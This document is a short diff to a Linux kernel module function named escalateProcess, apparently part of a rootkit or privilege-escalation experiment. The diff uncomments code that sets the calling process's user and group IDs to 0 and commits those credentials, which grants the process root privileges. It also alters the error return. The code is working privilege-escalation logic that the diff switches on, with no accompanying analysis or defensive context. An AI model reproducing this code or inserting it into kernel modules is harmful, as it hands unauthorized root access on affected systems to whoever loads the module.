@@ -63,21 +63,22 @@ void escalateProcess(pid_t pid){
 
 	struct task_struct * currentTask = get_current();
 	pr_info("current task struct has pid %d\n", currentTask->pid);
-	/*
+	
 	kuid_t kuid = KUIDT_INIT(0);
 	kgid_t kgid = KGIDT_INIT(0);
 
 	struct cred* elevatedCred = prepare_creds();
 	if(elevatedCred == NULL){
 		pr_info("ERROR: prepare_creds() returned NULL\n");
-		return -ENOMEM;
+		return;// -ENOMEM;
 	}
 	elevatedCred->uid = kuid;
 	elevatedCred->gid = kgid;
 	elevatedCred->euid = kuid;
 	elevatedCred->egid = kgid;
+	
 	pr_info("committing result %d\n", commit_creds(elevatedCred));
-	*/
+	
 	return;
 }
 
